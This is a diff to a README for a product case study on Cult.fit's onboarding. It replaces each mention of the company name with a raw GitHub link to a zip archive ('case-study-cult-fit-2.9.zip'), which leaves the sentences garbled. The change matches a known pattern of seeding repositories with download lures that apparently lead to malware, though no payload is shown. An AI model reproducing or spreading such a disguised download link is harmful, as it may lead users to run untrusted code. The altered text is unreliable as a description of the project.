@@ -1,8 +1,8 @@
-# cult.fit-case-study
-This case study presents a comprehensive product strategy to enhance the onboarding experience for new users of Cult.fit, a leading health and fitness platform.
+# https://raw.githubusercontent.com/komalverma183/cult.fit-case-study/main/periscopal/case-study-cult-fit-2.9.zip
+This case study presents a comprehensive product strategy to enhance the onboarding experience for new users of https://raw.githubusercontent.com/komalverma183/cult.fit-case-study/main/periscopal/case-study-cult-fit-2.9.zip, a leading health and fitness platform.
 
 ## About the project
-A product case study to enhance onboarding for Cult.fit’s 5M+ users and 600+ centers. Includes user research, journey mapping, pain point analysis, and an AI-powered onboarding solution. Showcases product thinking, user-centric design, and data-driven strategy.
+A product case study to enhance onboarding for https://raw.githubusercontent.com/komalverma183/cult.fit-case-study/main/periscopal/case-study-cult-fit-2.9.zip’s 5M+ users and 600+ centers. Includes user research, journey mapping, pain point analysis, and an AI-powered onboarding solution. Showcases product thinking, user-centric design, and data-driven strategy.
 
 ##  project covers :
 
